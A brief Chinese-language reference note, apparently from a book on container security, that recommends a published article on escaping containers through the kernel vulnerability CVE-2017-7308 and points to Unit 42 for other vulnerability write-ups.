**关于容器突破的精彩文章是《The Route to Root: Container Escape Using Kernel Exploitation》，在这篇文章中，Nimrod Stoler 利用 CVE-2017-7308 实现了逃离隔离的过程：[`bit.ly/2TfZHV1`](http://bit.ly/2TfZHV1)。**   其他漏洞的描述可以在[`unit42.paloaltonetworks.com/`](https://unit42.paloaltonetworks.com/)找到。*
